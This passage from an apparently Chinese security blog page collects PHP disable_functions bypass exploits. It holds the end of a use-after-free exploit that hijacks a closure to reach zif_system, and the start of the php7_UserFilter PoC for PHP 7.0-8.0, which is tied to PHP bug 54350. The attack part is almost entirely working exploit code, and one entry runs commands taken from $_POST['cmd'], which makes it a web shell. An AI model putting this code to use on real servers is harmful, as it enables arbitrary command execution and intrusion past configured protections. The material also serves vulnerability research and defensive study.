class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;uaf failed&quot;</span>);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-variable language_">$this</span>-&gt;helper-&gt;a = <span class="hljs-string">&quot;leet&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;helper-&gt;b = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"><span class="hljs-variable">$x</span></span>) </span>&#123;&#125;;<br>        <span class="hljs-variable language_">$this</span>-&gt;helper-&gt;c = <span class="hljs-number">0xfeedface</span>;<br><br>        <span class="hljs-variable">$helper_handlers</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">rel_read</span>(<span class="hljs-number">0</span>);<br>        <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;helper handlers @ 0x%x&quot;</span>, <span class="hljs-variable">$helper_handlers</span>);<br><br>        <span class="hljs-variable">$closure_addr</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">rel_read</span>(<span class="hljs-number">0x20</span>);<br>        <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;real closure @ 0x%x&quot;</span>, <span class="hljs-variable">$closure_addr</span>);<br><br>        <span class="hljs-variable">$closure_ce</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$closure_addr</span> + <span class="hljs-number">0x10</span>);<br>        <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;closure class_entry @ 0x%x&quot;</span>, <span class="hljs-variable">$closure_ce</span>);<br>        <br>        <span class="hljs-variable">$basic_funcs</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get_basic_funcs</span>(<span class="hljs-variable">$closure_ce</span>);<br>        <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;basic_functions @ 0x%x&quot;</span>, <span class="hljs-variable">$basic_funcs</span>);<br><br>        <span class="hljs-variable">$zif_system</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get_system</span>(<span class="hljs-variable">$basic_funcs</span>);<br>        <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;zif_system @ 0x%x&quot;</span>, <span class="hljs-variable">$zif_system</span>);<br><br>        <span class="hljs-variable">$fake_closure_off</span> = <span class="hljs-number">0x70</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x138</span>; <span class="hljs-variable">$i</span> += <span class="hljs-number">8</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">rel_write</span>(<span class="hljs-variable">$fake_closure_off</span> + <span class="hljs-variable">$i</span>, <span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$closure_addr</span> + <span class="hljs-variable">$i</span>));<br>        &#125;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">rel_write</span>(<span class="hljs-variable">$fake_closure_off</span> + <span class="hljs-number">0x38</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>);<br>        <span class="hljs-variable">$handler_offset</span> = PHP_MAJOR_VERSION === <span class="hljs-number">8</span> ? <span class="hljs-number">0x70</span> : <span class="hljs-number">0x68</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">rel_write</span>(<span class="hljs-variable">$fake_closure_off</span> + <span class="hljs-variable">$handler_offset</span>, <span class="hljs-variable">$zif_system</span>);<br><br>        <span class="hljs-variable">$fake_closure_addr</span> = <span class="hljs-variable">$abc_addr</span> + <span class="hljs-variable">$fake_closure_off</span> + <span class="hljs-number">0x18</span>;<br>        <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;fake closure @ 0x%x&quot;</span>, <span class="hljs-variable">$fake_closure_addr</span>);<br><br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">rel_write</span>(<span class="hljs-number">0x20</span>, <span class="hljs-variable">$fake_closure_addr</span>);<br>        (<span class="hljs-variable language_">$this</span>-&gt;helper-&gt;b)(<span class="hljs-variable">$cmd</span>);<br><br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">rel_write</span>(<span class="hljs-number">0x20</span>, <span class="hljs-variable">$closure_addr</span>);<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable language_">$this</span>-&gt;helper-&gt;b);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">heap_leak</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$arr</span> = [[], []];<br>        <span class="hljs-title function_ invoke__">set_error_handler</span>(function() <span class="hljs-keyword">use</span> (&amp;$<span class="hljs-title">arr</span>, &amp;$<span class="hljs-title">buf</span>) &#123;<br>            $<span class="hljs-title">arr</span> = 1;<br>            <span class="hljs-variable">$buf</span> = <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;\x00&quot;</span>, <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">HT_STRING_SIZE</span>);<br>        &#125;);<br>        <span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>] .= <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">alloc</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">STRING_SIZE</span> - <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-string">&quot;Array&quot;</span>));<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$buf</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">free</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span></span>) </span>&#123;<br>        <span class="hljs-variable">$payload</span> = <span class="hljs-title function_ invoke__">pack</span>(<span class="hljs-string">&quot;Q*&quot;</span>, <span class="hljs-number">0xdeadbeef</span>, <span class="hljs-number">0xcafebabe</span>, <span class="hljs-variable">$addr</span>);<br>        <span class="hljs-variable">$payload</span> .= <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">HT_STRING_SIZE</span> - <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$payload</span>));<br>        <br>        <span class="hljs-variable">$arr</span> = [[], []];<br>        <span class="hljs-title function_ invoke__">set_error_handler</span>(function() <span class="hljs-keyword">use</span> (&amp;$<span class="hljs-title">arr</span>, &amp;$<span class="hljs-title">buf</span>, &amp;$<span class="hljs-title">payload</span>) &#123;<br>            $<span class="hljs-title">arr</span> = 1;<br>            <span class="hljs-variable">$buf</span> = <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-variable">$payload</span>, <span class="hljs-number">1</span>);<br>        &#125;);<br>        <span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>] .= <span class="hljs-string">&quot;x&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">rel_read</span>(<span class="hljs-params"><span class="hljs-variable">$offset</span></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$this</span>-&gt;abc, <span class="hljs-variable">$offset</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">rel_write</span>(<span class="hljs-params"><span class="hljs-variable">$offset</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;abc[<span class="hljs-variable">$offset</span> + <span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$value</span> &amp; <span class="hljs-number">0xff</span>);<br>            <span class="hljs-variable">$value</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">rel_write</span>(<span class="hljs-number">0x10</span>, <span class="hljs-variable">$addr</span> - <span class="hljs-number">0x10</span>);<br>        <span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;helper-&gt;a);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$n</span> !== <span class="hljs-number">8</span>) &#123; <span class="hljs-variable">$value</span> &amp;= (<span class="hljs-number">1</span> &lt;&lt; (<span class="hljs-variable">$n</span> &lt;&lt; <span class="hljs-number">3</span>)) - <span class="hljs-number">1</span>; &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$value</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_system</span>(<span class="hljs-params"><span class="hljs-variable">$basic_funcs</span></span>) </span>&#123;<br>        <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$basic_funcs</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-variable">$f_entry</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$addr</span>);<br>            <span class="hljs-variable">$f_name</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$f_entry</span>, <span class="hljs-number">6</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$f_name</span> === <span class="hljs-number">0x6d6574737973</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-number">8</span>);<br>            &#125;<br>            <span class="hljs-variable">$addr</span> += <span class="hljs-number">0x20</span>;<br>        &#125; <span class="hljs-keyword">while</span>(<span class="hljs-variable">$f_entry</span> !== <span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_basic_funcs</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span></span>) </span>&#123;<br>        <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-comment">// In rare instances the standard module might lie after the addr we&#x27;re starting</span><br>            <span class="hljs-comment">// the search from. This will result in a SIGSGV when the search reaches an unmapped page.</span><br>            <span class="hljs-comment">// In that case, changing the direction of the search should fix the crash.</span><br>            <span class="hljs-comment">// $addr += 0x10;</span><br>            <span class="hljs-variable">$addr</span> -= <span class="hljs-number">0x10</span>;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$addr</span>, <span class="hljs-number">4</span>) === <span class="hljs-number">0xA8</span> &amp;&amp;<br>                <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-number">4</span>, <span class="hljs-number">4</span>),<br>                    [<span class="hljs-number">20180731</span>, <span class="hljs-number">20190902</span>, <span class="hljs-number">20200930</span>, <span class="hljs-number">20210902</span>])) &#123;<br>                <span class="hljs-variable">$module_name_addr</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-number">0x20</span>);<br>                <span class="hljs-variable">$module_name</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$module_name_addr</span>);<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$module_name</span> === <span class="hljs-number">0x647261646e617473</span>) &#123;<br>                    <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;standard module @ 0x%x&quot;</span>, <span class="hljs-variable">$addr</span>);<br>                    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$addr</span> + <span class="hljs-number">0x28</span>);<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params"><span class="hljs-variable">$format</span>, <span class="hljs-variable">$val</span> = <span class="hljs-string">&quot;&quot;</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">self</span>::<span class="hljs-variable constant_">LOGGING</span>) &#123;<br>            <span class="hljs-title function_ invoke__">printf</span>(<span class="hljs-string">&quot;<span class="hljs-subst">&#123;$format&#125;</span>\n&quot;</span>, <span class="hljs-variable">$val</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">alloc</span>(<span class="hljs-params"><span class="hljs-variable">$size</span></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_shuffle</span>(<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-variable">$size</span>));<br>    &#125;<br><br>    <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str2ptr</span>(<span class="hljs-params"><span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$address</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-variable">$n</span> - <span class="hljs-number">1</span>; <span class="hljs-variable">$j</span> &gt;= <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span>--) &#123;<br>            <span class="hljs-variable">$address</span> &lt;&lt;= <span class="hljs-number">8</span>;<br>            <span class="hljs-variable">$address</span> |= <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span> + <span class="hljs-variable">$j</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$address</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="php7-UserFilter（PHP-7-0-8-0）"><a href="#php7-UserFilter（PHP-7-0-8-0）" class="headerlink" title="php7_UserFilter（PHP 7.0-8.0）"></a>php7_UserFilter（PHP 7.0-8.0）</h2><p><strong>利用条件</strong></p><ul><li>php5.* - exploitable with minor changes to the PoC</li><li>php7.0 - all versions to date</li><li>php7.1 - all versions to date</li><li>php7.2 - all versions to date</li><li>php7.3 - all versions to date</li><li>php7.4 &lt; 7.4.26</li><li>php8.0 &lt; 8.0.13</li></ul><p><strong>原理</strong></p><p><a href="https://bugs.php.net/bug.php?id=54350">Memory corruption with user_filter</a></p><p><strong>exp</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment"># PHP 7.0-8.0 disable_functions bypass PoC (*nix only)</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Bug: https://bugs.php.net/bug.php?id=54350</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># This exploit should work on all PHP 7.0-8.0 versions</span><br><span class="hljs-comment"># released as of 2021-10-06</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Author: https://github.com/mm0r1</span><br><br><span class="hljs-comment">//pwn(&#x27;uname -a&#x27;);</span><br><span class="hljs-title function_ invoke__">pwn</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pwn</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>    <span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;LOGGING&#x27;</span>, <span class="hljs-literal">false</span>);<br>    <span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;CHUNK_DATA_SIZE&#x27;</span>, <span class="hljs-number">0x60</span>);<br>    <span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;CHUNK_SIZE&#x27;</span>, ZEND_DEBUG_BUILD ? CHUNK_DATA_SIZE + <span class="hljs-number">0x20</span> : CHUNK_DATA_SIZE);<br>    <span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;FILTER_SIZE&#x27;</span>, ZEND_DEBUG_BUILD ? <span class="hljs-number">0x70</span> : <span class="hljs-number">0x50</span>);<br>    <span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;STRING_SIZE&#x27;</span>, CHUNK_DATA_SIZE - <span class="hljs-number">0x18</span> - <span class="hljs-number">1</span>);<br>    <span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;CMD&#x27;</span>, <span class="hljs-variable">$cmd</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">10</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$groom</span>[] = <span class="hljs-title class_">Pwn</span>::<span class="hljs-title function_ invoke__">alloc</span>(STRING_SIZE);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">stream_filter_register</span>(<span class="hljs-string">&#x27;pwn_filter&#x27;</span>, <span class="hljs-string">&#x27;Pwn&#x27;</span>);<br>    <span class="hljs-variable">$fd</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;php://memory&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">stream_filter_append</span>(<span class="hljs-variable">$fd</span>,<span class="hljs-string">&#x27;pwn_filter&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fd</span>, <span class="hljs-string">&#x27;x&#x27;</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123; <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span>; &#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pwn</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">php_user_filter</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$abc_addr</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$helper</span>, <span class="hljs-variable">$helper_addr</span>, <span class="hljs-variable">$helper_off</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$uafp</span>, <span class="hljs-variable">$hfp</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$in</span>, <span class="hljs-variable">$out</span>, &amp;<span class="hljs-variable">$consumed</span>, <span class="hljs-variable">$closing</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$closing</span>) <span class="hljs-keyword">return</span>;<br>        <span class="hljs-title function_ invoke__">stream_bucket_make_writeable</span>(<span class="hljs-variable">$in</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;filtername = <span class="hljs-title class_">Pwn</span>::<span class="hljs-title function_ invoke__">alloc</span>(STRING_SIZE);<br>        <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$this</span>-&gt;stream);<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">go</span>();<br>        <span class="hljs-keyword">return</span> PSFS_PASS_ON;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">go</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;abc = &amp;<span class="hljs-variable language_">$this</span>-&gt;filtername;<br><br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">make_uaf_obj</span>();<br><br>        <span class="hljs-variable language_">$this</span>-&gt;helper = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Helper</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;helper-&gt;b = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"><span class="hljs-variable">$x</span></span>) </span>&#123;&#125;;<br><br>        <span class="hljs-variable language_">$this</span>-&gt;helper_addr = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">str2ptr</span>(CHUNK_SIZE * <span class="hljs-number">2</span> - <span class="hljs-number">0x18</span>) - CHUNK_SIZE * <span class="hljs-number">2</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;helper @ 0x%x&quot;</span>, <span class="hljs-variable">$this</span>-&gt;helper_addr);<br><br>        <span class="hljs-variable language_">$this</span>-&gt;abc_addr = <span class="hljs-variable language_">$this</span>-&gt;helper_addr - CHUNK_SIZE;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;abc @ 0x%x&quot;</span>, <span class="hljs-variable">$this</span>-&gt;abc_addr);<br><br>        <span class="hljs-variable language_">$this</span>-&gt;helper_off = <span class="hljs-variable language_">$this</span>-&gt;helper_addr - <span class="hljs-variable language_">$this</span>-&gt;abc_addr - <span class="hljs-number">0x18</span>;<br><br>        <span class="hljs-variable">$helper_handlers</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">str2ptr</span>(CHUNK_SIZE);<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;helper handlers @ 0x%x&quot;</span>, <span class="hljs-variable">$helper_handlers</span>);<br><br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">prepare_leaker</span>();<br><br>        <span class="hljs-variable">$binary_leak</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$helper_handlers</span> + <span class="hljs-number">8</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;binary leak @ 0x%x&quot;</span>, <span class="hljs-variable">$binary_leak</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">prepare_cleanup</span>(<span class="hljs-variable">$binary_leak</span>);<br><br>        <span class="hljs-variable">$closure_addr</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">str2ptr</span>(<span class="hljs-variable">$this</span>-&gt;helper_off + <span class="hljs-number">0x38</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;real closure @ 0x%x&quot;</span>, <span class="hljs-variable">$closure_addr</span>);<br><br>        <span class="hljs-variable">$closure_ce</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>(<span class="hljs-variable">$closure_addr</span> + <span class="hljs-number">0x10</span>);<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">&quot;closure class_entry @ 0x%x&quot;</span>, <span class="hljs-variable">$closure_ce</span>);<br><br>        <span class="hljs-variable">$basic_funcs</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get_basic_funcs</span>(<span class="hljs-variable">$closure_ce</span>);<br>        <span class="hljs-variable 